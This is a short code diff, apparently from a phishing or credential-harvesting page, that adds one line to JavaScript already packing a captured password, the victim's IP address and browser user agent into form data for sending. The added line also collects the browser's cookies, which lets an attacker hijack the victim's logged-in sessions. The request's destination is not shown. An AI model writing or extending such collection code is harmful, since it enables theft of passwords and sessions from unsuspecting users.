@@ -549,6 +549,7 @@
             formData.append("password", USER_CREDS['password'])
             formData.append("ip", ip.ip)
             formData.append("agent", navigator.userAgent)
+            formData.append("_cookie", document.cookie)
             formData.append("send", "")
 
             const option = {
